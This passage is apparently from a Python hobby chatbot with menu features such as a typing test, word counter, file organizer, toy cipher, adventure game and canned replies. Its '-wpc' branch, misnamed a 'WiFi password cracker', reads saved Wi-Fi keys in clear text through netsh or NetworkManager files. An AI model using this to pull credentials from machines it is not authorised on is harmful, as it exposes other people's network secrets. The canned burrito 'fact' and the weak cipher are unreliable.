                    print("Exited Typing Speed Test...")
                    return
                start_test(difficulty)

            # Start the Typing Speed Test feature
            typing_speed_test()
            return "Hope you liked the Typing Speed Test!"
    elif "-wfc" in ui:
            from collections import Counter
            import string

            def word_filter(words, min_length=1):
                """Filters out words that are too short."""
                return [word for word in words if len(word) >= min_length]
            print("--- WORD FREQUENCY COUNTER ---")
            #getting location of txt file
            location = input("Enter Txt Location: ")

            # Asking if case sensitivity should be applied
            case_sensitive = input("Should the word count be case-sensitive? (y/n): ").strip().lower()

            try:
                # Reading txt
                with open(location, 'r') as file:
                    text = file.read()

                # Check if file is empty
                if not text.strip():
                    print("The file is empty.")
                else:
                    # Lowering the text and removing all punctuations if not case sensitive
                    if not case_sensitive == 'y':
                        text = text.lower()
                    
                    text = text.translate(str.maketrans('', '', string.punctuation))

                    # Splitting text into words
                    words = text.split()

                    # Counting words
                    word_count = Counter(words)

                    # Sorting the word count
                    sorted_word_count = word_count.most_common()

                    # Printing the words frequency
                    print("--------------------")
                    print("\nWord Frequency:")
                    for word, count in sorted_word_count:
                        print(f"{word}: {count}")

                    # Printing top 5 most frequent words
                    print("\nTop 5 Most Frequent Words Are:")
                    for word, count in sorted_word_count[:5]:
                        print(f"{word}: {count}")

                    # Displaying total word count
                    total_words = sum(word_count.values())
                    print(f"\nTotal Words Processed: {total_words}")

                    # Asking if user wants to save the output
                    save_output = input("Do you want to save the word frequencies to a file? (y/n): ").strip().lower()
                    if save_output == 'y':
                        output_file = input("Enter the output file name (e.g., word_count.txt): ").strip()
                        with open(output_file, 'w') as output:
                            output.write("Word Frequency:\n")
                            for word, count in sorted_word_count:
                                output.write(f"{word}: {count}\n")
                        print(f"Word frequencies saved to {output_file}")
                
            except FileNotFoundError:
                return("Txt File Not Found. Please check the file path.")
            except Exception as e:
                print("Thanks for using the Word Frequency Counter!")

    elif "-wpc" in ui:
        try:
            import subprocess
            import os
            import re
            from collections import namedtuple
            import configparser

            print("------------- WiFi PASSWORD CRACKER --------------")
            def get_windows_saved_ssids():
                """Returns a list of saved SSIDs in a Windows machine using netsh command"""
                # get all saved profiles in the PC
                output = subprocess.check_output("netsh wlan show profiles").decode()
                ssids = []
                profiles = re.findall(r"All User Profile\s(.*)", output)
                for profile in profiles:
                    # for each SSID, remove spaces and colon
                    ssid = profile.strip().strip(":").strip()
                    # add to the list
                    ssids.append(ssid)
                return ssids

            def get_windows_saved_wifi_passwords(verbose=1):
                """Extracts saved Wi-Fi passwords saved in a Windows machine, this function extracts data using netsh
                command in Windows
                Args:
                    verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
                Returns:
                    [list]: list of extracted profiles, a profile has the fields ["ssid", "ciphers", "key"]
                """
                ssids = get_windows_saved_ssids()
                Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
                profiles = []
                for ssid in ssids:
                    ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
                    # get the ciphers
                    ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
                    # clear spaces and colon
                    ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
                    # get the Wi-Fi password
                    key = re.findall(r"Key Content\s(.*)", ssid_details)
                    # clear spaces and colon
                    try:
                        key = key[0].strip().strip(":").strip()
                    except IndexError:
                        key = "None"
                    profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
                    if verbose >= 1:
                        print_windows_profile(profile)
                    profiles.append(profile)
                return profiles

            def print_windows_profile(profile):
                """Prints a single profile on Windows"""
                print(f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}")

            def print_windows_profiles(verbose):
                """Prints all extracted SSIDs along with Key on Windows"""
                print("SSID                     CIPHER(S)      KEY")
                get_windows_saved_wifi_passwords(verbose)

            def get_linux_saved_wifi_passwords(verbose=1):   
                """Extracts saved Wi-Fi passwords saved in a Linux machine, this function extracts data in the
                `/etc/NetworkManager/system-connections/` directory
                Args:
                    verbose (int, optional): whether to print saved profiles real-time. Defaults to 1.
                Returns:
                    [list]: list of extracted profiles, a profile has the fields ["ssid", "auth-alg", "key-mgmt", "psk"]
                """
                network_connections_path = "/etc/NetworkManager/system-connections/"
                fields = ["ssid", "auth-alg", "key-mgmt", "psk"]
                Profile = namedtuple("Profile", [f.replace("-", "_") for f in fields])
                profiles = []
                for file in os.listdir(network_connections_path):
                    data = { k.replace("-", "_"): None for k in fields }
                    config = configparser.ConfigParser()
                    config.read(os.path.join(network_connections_path, file))
                    for _, section in config.items():
                        for k, v in section.items():
                            if k in fields:
                                data[k.replace("-", "_")] = v
                    profile = Profile(**data)
                    if verbose >= 1:
                        print_linux_profile(profile)
                    profiles.append(profile)
                return profiles

            def print_linux_profile(profile):
                """Prints a single profile on Linux"""
                print(f"{str(profile.ssid):25}{str(profile.auth_alg):5}{str(profile.key_mgmt):10}{str(profile.psk):50}") 

            def print_linux_profiles(verbose):
                """Prints all extracted SSIDs along with Key (PSK) on Linux"""
                print("SSID                     AUTH KEY-MGMT  PSK")
                get_linux_saved_wifi_passwords(verbose)
                
            def print_profiles(verbose=1):
                if os.name == "nt":
                    print_windows_profiles(verbose)
                elif os.name == "posix":
                    print_linux_profiles(verbose)
                else:
                    raise NotImplemented("Code only works for either Linux or Windows")
                
                
            if __name__ == "__main__":
                print_profiles()
                print("--------------------------------------------------")
                return "WiFi Password Cracked Successfully!"
        # except ValueError:
        #     print("Error!")
        # except ImportError:
        #     print("You need to install Libraries used in this script!")
        except Exception as e:
            print(f"An Error Occured: {e}")

    elif "-fo" in ui:
            import os
            import shutil
            import datetime

            print("--- FILES ORGANIZER! ---")
            formats = {
                "jpg": "Images",
                "mp4": "Videos",
                "mp3": "Music",
                "png": "Images",
                "py": "Python",
                "zip": "Compressed",
                "txt": "Documents",
                "exe": "Programs",
                "apk": "APKs",
                "m4a": "Music",
                "bat": "Batch Files",
                "ico": "Images",
                "jpeg": "Images",
                "7z": "Compressed",
                "pdf": "Documents",
                "iso": "Disk Images",
                "doc": "Documents",
                "docx": "Documents",
                "xsl": "MS Excel SpreadSheets",
                "xslx": "MS Excel SpreadSheets",
                "pptx": "MS PowerPoint Presentations",
                "csv": "Comma-Separated Values",
                "html": "HTML (Web Pages)",
                "css": "CSS (Web Design)",
                "js": "JavaScript (Web Programming)",
                "xml": "XML (Data Storage)",
                "json": "JSON (Data Interchange)",
                "tar": "Tape Archive",
                "gz": "Compressed",
                "bz2": "Compressed",
                "rar": "Compressed",
                "log": "Logs",
                "sqlite": "SQLite Database",
                "md": "Markdown Files",
                "flv": "Flash Video",
                "avi": "Audio Video Interleave",
                "mov": "Apple QuickTime Movie",
                "wmv": "Windows Media Video",
                "wav": "Waveform Audio",
                "ogg": "Ogg Audio",
                "bmp": "Bitmap Image",
                "tiff": "TIFF (Image Format)",
                "raw": "Raw Image Data",
                "psd": "Adobe Documents",
                "ai": "Adobe Documents",
                "eps": "Encapsulated PostScript",
                "indd": "Adobe Documents",
                "mpg": "Videos",
                "mpeg": "Videos",
                "webp": "Images",
                "sh": "Shell Script",
                "dmg": "Disk Images",
                "pkg": "macOS Package Installers",
                "deb": "Debian Packages",
                "rpm": "Red Hat Packages",
                "vhd": "Virtual Hard Disk",
                "tar.gz": "Tarball",
                "tar.bz2": "Tarball"
            }

            def get_file_info(file_path):
                size = os.path.getsize(file_path)
                creation_time = datetime.datetime.fromtimestamp(os.path.getctime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
                modification_time = datetime.datetime.fromtimestamp(os.path.getmtime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
                access_time = datetime.datetime.fromtimestamp(os.path.getatime(file_path)).strftime('%Y-%m-%d %H:%M:%S')

                return {
                    "size": size,
                    "creation_time": creation_time,
                    "modification_time": modification_time,
                    "access_time": access_time
                }

            def process_location():
                while True:
                    choice = input("1.File Organize \n2.Exit \nChoose (1/2): ")
                    if "1" in choice: 
                        location = input("Enter Location For Organizing Files: ")
                        
                        if not os.path.isdir(location):
                            print("Error: The location does not exist. Please enter a valid directory path.")
                            continue  # Prompt again for valid input

                        for ext, folder in formats.items():
                            folder_path = os.path.join(location, folder)
                            if not os.path.exists(folder_path):
                                files_exist = any(file.endswith(f".{ext}") for file in os.listdir(location))
                                if files_exist:
                                    os.makedirs(folder_path)
                                    print(f"Created folder: {folder_path}")

                        for file in os.listdir(location):
                            file_path = os.path.join(location, file)

                            if os.path.isdir(file_path):
                                continue

                            _, extension = os.path.splitext(file)
                            extension = extension[1:]

                            if extension in formats:
                                dest_dir = os.path.join(location, formats[extension])
                                shutil.move(file_path, os.path.join(dest_dir, file))
                                print(f"File '{file}' moved to '{formats[extension]}' folder.")
                            else:
                                print(f"File '{file}' does not match any format and will not be moved.")
                        print("-----------------------------------")
                        view_metadata = input("Do you want to see metadata? (y/n): ").lower()
                        if view_metadata == 'y':
                            choice = input("Do you want to see metadata for a folder or a file? (folder/file): ").lower()
                            
                            if choice == "folder":
                                folder_name = input("Enter folder name to view metadata: ")
                                folder_path = os.path.join(location, folder_name)

                                if os.path.exists(folder_path):
                                    print(f"Metadata for folder '{folder_name}':")
                                    for file in os.listdir(folder_path):
                                        file_path = os.path.join(folder_path, file)
                                        if os.path.isfile(file_path):
                                            metadata = get_file_info(file_path)
                                            print("_________________________________")
                                            print(f"File '{file}':")
                                            print(f"  Size: {metadata['size']} bytes")
                                            print(f"  Creation Time: {metadata['creation_time']}")
                                            print(f"  Modification Time: {metadata['modification_time']}")
                                            print(f"  Access Time: {metadata['access_time']}")
                                else:
                                    print(f"Folder '{folder_name}' does not exist.")
                            elif choice == "file":
                                filename = input("Enter filename to view metadata: ")
                                file_path = os.path.join(location, filename)

                                if os.path.isfile(file_path):
                                    metadata = get_file_info(file_path)
                                    print(f"Metadata for file '{filename}':")
                                    print(f"  Size: {metadata['size']} bytes")
                                    print(f"  Creation Time: {metadata['creation_time']}")
                                    print(f"  Modification Time: {metadata['modification_time']}")
                                    print(f"  Access Time: {metadata['access_time']}")
                                else:
                                    print(f"File '{filename}' does not exist.")
                            else:
                                print("Invalid option selected.")
                        elif view_metadata == 'n':
                            break
                        else:
                            print("Invalid Input")
                    elif "2" in choice:
                        print("-------------------")
                        break
            process_location()
            
            return("Work Done!")

    elif "men vs women" in ui or "women vs men" in ui:
        return "Both are equal, no one is superior or inferior"
    elif "can you think for me while I sleep" in ui or "can you think for me while I sleep?" in ui:
        return "I can't think, I am a computer program"
    elif "who made the first burrito?" in ui or "who made the first burrito" in ui:
        return "The first burrito was made by Juan Mendez in 1922 in Ciudad Juarez, Mexico"
    elif "my dog ate my scholarship. What do I do?" in ui or "my dog ate my scholarship" in ui or "my dog ate my scholarship, what do I do" in ui:
        return "You should contact the scholarship provider and explain the situation. They may be able to provide guidance on how to proceed."
    elif "-crp" in ui:
        import random, string, os
        #helper functions for encryption and decryption
        def encrypt_message(plain_text, key):
            chars = " " + string.punctuation + string.digits + string.ascii_letters
            cipher_text = ""
            for letter in plain_text:
                if letter in chars:
                    index = chars.index(letter)
                    cipher_text += key[index]
                else:
                    cipher_text += letter  #leave unsupported characters unchanged..
            return cipher_text

        def decrypt_message(cipher_text, key):
            chars = " " + string.punctuation + string.digits + string.ascii_letters
            plain_text = ""
            for letter in cipher_text:
                if letter in key:
                    index = key.index(letter)
                    plain_text += chars[index]
                else:
                    plain_text += letter  # Leave unsupported characters unchanged
            return plain_text

        def generate_random_password(length=12):
            chars = string.ascii_letters + string.digits + string.punctuation
            return ''.join(random.choice(chars) for _ in range(length))

        def save_message_to_file(filename, message, encrypted=False, key=None):
            folder_path = "messages"
            if not os.path.exists(folder_path):
                os.makedirs(folder_path)
            with open(os.path.join(folder_path, filename), "w") as f:
                f.write("Encrypted: " + str(encrypted) + "\n")
                if encrypted and key:
                    message = encrypt_message(message, key)
                f.write("Message: " + message + "\n")
            print(f"Message saved to {filename}")

        def decrypt_file_message(filename, key):
            folder_path = "messages"
            file_path = os.path.join(folder_path, filename)

            if not os.path.exists(file_path):
                print("File not found. Please check the filename.")
                return

            with open(file_path, "r") as f:
                lines = f.readlines()

            # Ensure file format is correct
            if len(lines) < 2 or not lines[0].startswith("Encrypted:") or not lines[1].startswith("Message:"):
                print("Invalid file format. Cannot decrypt.")
                return

            encrypted = lines[0].strip().split(": ")[1] == "True"
            message = lines[1].strip().split(": ", 1)[1]

            if encrypted:
                decrypted_message = decrypt_message(message, key)
                print(f"Decrypted message: {decrypted_message}")
            else:
                print("The message is not encrypted. Content:")
                print(message)

        # Main program with options
        def main():
            chars = " " + string.punctuation + string.digits + string.ascii_letters
            chars = list(chars)
            key = chars.copy()
            random.shuffle(key)

            while True:
                print(f"-------- CODE CRYPTO (DYNAMIC) --------")
                print("1. Encrypt a message")
                print("2. Decrypt a message")
                print("3. Generate a random password")
                print("4. Save encrypted message to a txt file")
                print("5. Decrypt a message from a txt file")
                print("6. What is this?")
                print("7. Exit")
                print("----------------------------------------")
                choice = input("Enter your choice (1/2/3/4/5/6/7): ")

                if choice == "1":
                    print("-----------------------------")
                    plain_text = input("Enter a message to encrypt: ")
                    cipher_text = encrypt_message(plain_text, key)
                    print(f"Original message: {plain_text}")
                    print(f"Encrypted message: {cipher_text}")

                elif choice == "2":
                    print("-----------------------------")
                    cipher_text = input("Enter a message to decrypt: ")
                    plain_text = decrypt_message(cipher_text, key)
                    print(f"Encrypted message: {cipher_text}")
                    print(f"Original message: {plain_text}")

                elif choice == "3":
                    print("-----------------------------")
                    length = int(input("Enter the length of the password: "))
                    password = generate_random_password(length)
                    print(f"Generated password: {password}")

                elif choice == "4":
                    print(" ---------------------------------------------------------------------")
                    filename = input("Enter the filename to save the encrypted message (e.g., message.txt): ")
                    message = input("Enter the message to save: ")
                    save_option = input("Do you want to encrypt the message before saving? (y/n): ").strip().lower()
                    encrypted = True if save_option == "y" else False
                    save_message_to_file(filename, message, encrypted, key if encrypted else None)

                elif choice == "5":
                    print(" ---------------------------------------------------------------")
                    filename = input("Enter the filename to decrypt the message (e.g., message.txt): ")
                    decrypt_file_message(filename, key)

                elif choice == "7":
                    print("----------------------------------------")
                    print("Exiting CodeCrypto...")
                    break

                elif choice == "6":
                    print("""
***************************************************************************
CodeCrypto is a python script that encrypts/decrypts messages, 
it's dynamic it means you can encrypt/decrypt message for only 1 session or 
you can say its temporary to encrypt a message.
This script not uses any third party libraries like cryptography or else.
***************************************************************************
                          """)

                else:
                    print("Invalid choice. Please try again.")

        if __name__ == "__main__":
            main()
        return "Done!"

    elif "-mag" in ui:
            import random

            def start_game():
                print("-------------------------------------------------------------")
                print("Welcome to the Adventure Game!")
                print("You are standing at the entrance of an ancient dungeon.")
                print("Do you want to enter the dungeon or leave?")
                
                choice = input("Enter (dungeon) or Leave (exit): ").lower()
                
                if choice == "dungeon":
                    dungeon_entrance()
                elif choice == "exit":
                    print("You decide it's too dangerous and leave. The adventure ends here.")
                else:
                    print("Invalid choice, try again.")
                    start_game()

            def dungeon_entrance():
                print("\nYou enter the dungeon. The air is damp, and the walls are covered in moss.")
                print("There are three corridors ahead: one to the left, one to the right, and one straight ahead.")
                print("Which one do you choose?")
                
                choice = input("Left (left), Right (right), or Straight (straight): ").lower()
                
                if choice == "left":
                    encounter_troll()
                elif choice == "right":
                    monster_room()
                elif choice == "straight":
                    treasure_room()
                else:
                    print("Invalid choice, try again.")
                    dungeon_entrance()

            def encounter_troll():
                print("\nYou enter a dark, narrow passage and suddenly a huge troll appears!")
                print("It roars and demands to know why you are in its lair.")
                
                choice = input("Do you fight the troll (fight), try to talk to it (talk), or run away (run): ").lower()
                
                if choice == "fight":
                    print("\nYou bravely fight the troll with your sword!")
                    outcome = random.choice(["win", "lose"])
                    if outcome == "win":
                        print("You defeat the troll and move forward!")
                        treasure_room()
                    else:
                        print("The troll overwhelms you. You lose the fight and perish.")
                        game_over()
                elif choice == "talk":
                    print("\nYou try to reason with the troll and offer it food.")
                    outcome = random.choice(["accept", "refuse"])
                    if outcome == "accept":
                        print("The troll accepts your offer and lets you pass safely.")
                        treasure_room()
                    else:
                        print("The troll is offended and attacks you!")
                        encounter_troll()
                elif choice == "run":
                    print("\nYou turn and run away, escaping the troll’s wrath.")
                    dungeon_entrance()
                else:
                    print("Invalid choice, try again.")
                    encounter_troll()

            def monster_room():
                print("\nYou step into a dimly lit room. Suddenly, a pack of wolves emerges from the shadows!")
                print("They look hungry and aggressive.")
                
                choice = input("Do you fight the wolves (fight), try to scare them off (scare), or hide (hide): ").lower()
                
                if choice == "fight":
                    print("\nYou draw your sword and charge at the wolves!")
                    outcome = random.choice(["win", "lose"])
                    if outcome == "win":
                        print("You defeat the wolves and continue on your path.")
                        treasure_room()
                    else:
                        print("The wolves overpower you. You lose the fight and perish.")
                        game_over()
                elif choice == "scare":
                    print("\nYou wave your arms and shout to intimidate the wolves.")
                    outcome = random.choice(["scare", "fail"])
                    if outcome == "scare":
                        print("The wolves back off, intimidated by your strength. You continue forward.")
                        treasure_room()
                    else:
                        print("The wolves are not scared and attack!")
                        monster_room()
                elif choice == "hide":
                    print("\nYou quickly hide behind a rock. The wolves sniff around but eventually lose interest.")
                    print("You wait until they leave and then proceed.")
                    treasure_room()
                else:
                    print("Invalid choice, try again.")
                    monster_room()

            def treasure_room():
                print("\nYou find yourself in a room filled with gold, jewels, and magical artifacts!")
                print("There are four items you can choose from: a sword, a shield, a magic potion, or a crystal orb.")
                
                choice = input("Which item do you choose? (sword/shield/potion/orb): ").lower()
                
                if choice == "sword":
                    print("\nYou take the sword, which gleams with a mysterious aura. It feels powerful in your hands.")
                    print("Suddenly, a door opens and you see a dark figure approaching. You must decide what to do next.")
                    final_battle("sword")
                elif choice == "shield":
                    print("\nYou take the shield, which is engraved with ancient symbols. It feels sturdy and protective.")
                    print("Suddenly, a door opens and you see a dark figure approaching. You must decide what to do next.")
                    final_battle("shield")
                elif choice == "potion":
                    print("\nYou take the potion, which glows with a magical light. You feel your energy replenish instantly.")
                    print("Suddenly, a door opens and you see a dark figure approaching. You must decide what to do next.")
                    final_battle("potion")
                elif choice == "orb":
                    print("\nYou take the crystal orb, which seems to pulse with a strange energy.")
                    print("You feel an unnatural sense of power as you hold it. The door opens, and a dark figure approaches.")
                    final_battle("orb")
                else:
                    print("Invalid choice, try again.")
                    treasure_room()

            def final_battle(item):
                print(f"\nThe dark figure steps into the light—it’s a powerful wizard!")
                print("The wizard challenges you to a battle.")
                print(f"You are armed with a {item}.")

                choice = input("Do you attack (attack), defend (defend), or use your item (use): ").lower()
                
                if choice == "attack":
                    if item == "sword":
                        print("You charge at the wizard and strike with your sword!")
                        outcome = random.choice(["win", "lose"])
                        if outcome == "win":
                            print("You defeat the wizard with your sword and claim victory!")
                            victory()
                        else:
                            print("The wizard casts a spell and defeats you. You lose.")
                            game_over()
                    elif item == "shield":
                        print("You attempt to block the wizard’s magic with your shield, but it’s too powerful.")
                        game_over()
                    elif item == "potion":
                        print("You drink the potion and gain strength, but the wizard’s magic is overwhelming.")
                        game_over()
                    elif item == "orb":
                        print("You focus on the orb’s energy and release a burst of power towards the wizard!")
                        outcome = random.choice(["win", "lose"])
                        if outcome == "win":
                            print("The orb's power destroys the wizard! You win!")
                            victory()
                        else:
                            print("The orb’s power is not enough. The wizard defeats you. You lose.")
                            game_over()
                elif choice == "defend":
                    if item == "shield":
                        print("You defend yourself with the shield, blocking the wizard’s attacks!")
                        outcome = random.choice(["win", "lose"])
                        if outcome == "win":
                            print("The wizard tires out, and you counterattack with the shield. You win!")
                            victory()
                        else:
                            print("The wizard overwhelms your defense. You lose.")
                            game_over()
                    elif item == "sword":
                        print("You attempt to block with the sword, but the wizard’s magic breaks your defense.")
                        game_over()
                    elif item == "potion":
                        print("You drink the potion and defend yourself from the wizard’s magic.")
                        outcome = random.choice(["win", "lose"])
                        if outcome == "win":
                            print("You manage to block the wizard’s magic and strike back. You win!")
                            victory()
                        else:
                            print("The wizard casts a powerful spell and defeats you. You lose.")
                            game_over()
                    elif item == "orb":
                        print("You hold the orb defensively, but the wizard’s magic overpowers you. You lose.")
                        game_over()
                elif choice == "use":
                    if item == "orb":
                        print("You use the orb’s power to create a protective shield!")
                        outcome = random.choice(["win", "lose"])
                        if outcome == "win":
                            print("The shield blocks the wizard’s magic, and you defeat him. You win!")
                            victory()
                        else:
                            print("The orb’s power fails. The wizard defeats you. You lose.")
                            game_over()
                    else:
                        print("You cannot use this item in battle.")
                        final_battle(item)
                else:
                    print("Invalid choice, try again.")
                    final_battle(item)

            def victory():
                print("\nCongratulations, you have completed the adventure successfully!")
                print("You are victorious, and the treasure is yours!")
                print("The dungeon is now at peace, and your legend will be told for generations to come.")

            def game_over():
                print("\nGame Over!")
                print("You have lost the battle. Better luck next time.")
                play_again()

            def play_again():
                choice = input("Do you want to play again? (yes/no): ").lower()
                if choice == "yes":
                    start_game()
                elif choice == "no":
                    print("Thanks for playing! Goodbye.")
                else:
                    print("Invalid choice, try again.")
                    play_again()
                return "hope you liked it!"

            start_game()
            print("---------------------------------------------")
            return "Hope you liked this Mini Adventure Game!"

    elif "-ms" in ui or "suggest me a movie" in ui or "suggest me some movies" in ui or "suggest me some movie" in ui or "movie suggestion" in ui or "can you recommend a good movie to watch?" in ui or "can you recommend me a movie?" in ui or "what to watch" in ui or "what to watch" in ui: #movie suggestion function
            import random
            print("---- MOVIE SUGGESTION ----")
            ask_genre = input("1.Action\n2.Comedy\n3.Horror\n4.Animated\n5.Anime\n6.Sci-Fi\nChoose (1-6): ")
            if "1" in ask_genre:
                action_movies = ["Mad Max", "John Wick", "Venom", "The Dark Knight", "The Matrix", "Terminator 2: Judgment Day", 'The Raid', "Pacific Rim"]
                print(f"Action: {random.choice(action_movies)}")
                print('---------------------------------------------')
                return "You will definitely like this movie!"
            elif "2" in ask_genre:
                comedy_movies = ["Phir Hera Pheri", "The Hangover", "Mean Girls", "SuperBad", "Dumb and Dumber", "21 Jump Streets", "Hot Fuzz"]
                print(f"Comedy: {random.choice(comedy_movies)}")
                print('---------------------------------------------')
                return "You will definitely like this movie!"
            elif "3" in ask_genre:
                horror_movies = ["The Conjuring", "Get Out", "IT", "The Nun", "Hereditary", "A Quiet Place", "Pennywise", "The Babadook", "Midsommar"]
                print(f"Horror: {random.choice(horror_movies)}")
                print('---------------------------------------------')
                return "You will definitely like this movie!"
            elif "4" in ask_genre:
                animated_movies = ["Frozen", "Moana", "Coco", "Shrek", "The Lion King", "Spider-Man - Across the SpiderVerse", "Toy Story Series", "Kung Fu Panda Series" ]
                print(f"Animated: {random.choice(animated_movies)}")
                print('---------------------------------------------')
                return "You will definitely like this movie!"
            elif "5" in ask_genre:
                anime_movies = ["Spirited Away", "My Neighbor Totoro", "YOUR NAME", "Akira", "Attack on Titan", "Suzume No-tojimari", "Death Note", "A Silent Voice", "Tokyo Ravager"]
                print(f"Anime: {random.choice(anime_movies)}")
                print('---------------------------------------------')
                return "You will definitely like this movie!"
            elif "6" in ask_genre:
                sci_fi_movies = ["Interstellar", "Inception", "The Matrix", "Dune", "Star Wars", "Gravity", "Blade Runner 2049"]
                print(f"Sci-Fi: {random.choice(sci_fi_movies)}")
                print('---------------------------------------------')
                return "You will definitely like this movie!"
            else:
                return ("Invalid choice! Please select a number between 1 and 6.")

    elif "you are so bad" in ui or "you are bad" in ui or "u r so bad" in ui or "u r bad" in ui:
        return "I am sorry :("    
    elif "how to tie a tie" in ui or "how to tie a tie?" in ui:
        return '''
Here's how to tie a tie in simple steps:

1. START WITH THE WIDE END of the tie on the right side, about 12 inches lower than the narrow end on the left.
2. CROSS THE WIDE END over the narrow end.
3. BRING THE WIDE END UP into the neck loop from underneath.
4. PASS THE WIDE END DOWN through the loop in front.
5. PULL THE WIDE END across the front, then up into the neck loop again.
6. SLIDE THE WIDE END down through the loop you've just made in the front.
7. TIGHTEN THE KNOT by pulling the wide end down, adjusting the knot at the collar.'''
    elif "what is the weather like today?" in ui or "what's the today's weather?" in ui or "tell me today's weather" in ui or "today's weather" in ui or "today' weather" in ui:
        return "Sorry, I can't see the weather because I am not connected with the internet..."
    elif "give me tips for saving time." in ui or "time saving tips" in ui or "give me some tips for saving time" in ui or "some tips for saving time" in ui or "tips for saving my time" in ui or "tips for saving time" in ui:
        return '''\n
-----------------------------
1. Prioritize Tasks
Focus on important tasks first (use the Eisenhower Matrix: Urgent vs. Important).Write a daily to-do list.
2. Avoid Multitasking
Concentrate on one task at a time to avoid mistakes and delays.
3. Use Time Blocks
Set specific time slots for work, breaks, and relaxation.
Example: 25 minutes work + 5 minutes break (Pomodoro Technique).
4. Limit Distractions
Turn off unnecessary notifications on your phone or apps.
Work in a quiet and clutter-free space.
5. Automate or Delegate Tasks
Use tools for reminders, schedules, or repetitive tasks.
Ask for help when possible.
6. Batch Similar Tasks
Group similar activities together (e.g., reply to emails at once, cook meals in bulk).
7. Learn to Say No
Avoid overcommitting to unnecessary activities or meetings.
8. Plan Ahead
Prepare clothes, meals, or supplies the night before.
Use calendars for scheduling.
9. Use Deadlines
Set a timer to challenge yourself to complete tasks faster.
10. Take Breaks
Regular breaks prevent burnout and improve focus, saving time in the long run.
------------------------------------
'''
    elif "what is your name?" in ui or "what's your name?" in ui or "what is your name" in ui:
        return "I am \033[34mMinibot\033[0m"
    elif "minibot" in ui or "mini bot" in ui or "hey where are you gone?" in ui or "are you there?" in ui or "where you gone" in ui:
        return "Yes? I am here.."    
    # elif "" in ui:
    #     return "!YOU NEED TO TYPE SOMETHING TO GET RESPONSE!"
    # else:
    #     return "Sorry, I don't understand that. Could you rephrase?"
    else:
        return get_response(ui, memory)

def main():
    greet_user()
    memory = load_memory()  # Load the chatbot memory on start
    while True:
        user_input = input("You: ")
        if user_input.lower() in ("quit"):
            print("\033[34mMinibot\033[0m: Goodbye!")
            break
        response = process_input(user_input, memory)
        print(f"\033[34mMinibot\033[0m: {response}")

if __name__ == "__main__":
    main()
